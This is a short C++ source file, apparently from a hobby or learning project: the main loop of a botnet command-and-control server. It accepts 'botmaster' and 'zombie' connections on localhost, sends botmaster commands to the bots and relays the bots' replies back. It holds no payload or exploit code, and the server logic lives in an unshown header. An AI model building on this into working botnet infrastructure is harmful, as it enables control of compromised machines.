#include <iostream>

#include "Server.h"

int main()
{
	std::cout << "Init CanC" << std::endl;
	Server CandC("127.0.0.1", 54002);

	if (!CandC.init())
		return 0;

	if (CandC.createListeningSocket())
	{
		while (true)
		{
			CandC.waiting();					//blocking till something happens

			switch (CandC.acceptConnection())
			{
			case WEIRDO:
				std::cout << "Weido tried to connect" << std::endl;
				break;
			case BOTMASTER: 
				std::cout << "Botmaster connected" << std::endl;
				break;
			case ZOMBIE:
				std::cout << "New Zombie" << std::endl;
				break;
			default:
				break;
			}

			if (CandC.receive())
			{
				std::string bmsg = CandC.getBotMasterMessage();
				if (!bmsg.empty())
				{
					std::cout << bmsg << std::endl;
					CandC.sendToZombies(bmsg.c_str(), bmsg.size());
				}

				std::vector<const char*> zmsgs = CandC.getBotMessages();
				for (const char* zmsg : zmsgs)
				{
					std::cout << zmsg << std::endl;
					CandC.sendToBotmaster(zmsg, strlen(zmsg));
				}

				if (CandC.clientDisconnect())
				{
					CandC.closeConnections();
				}
			}
		}
	}
	else
	{
		std::cout << "couldnt create server socket" << std::endl;
	}

	return 0;
}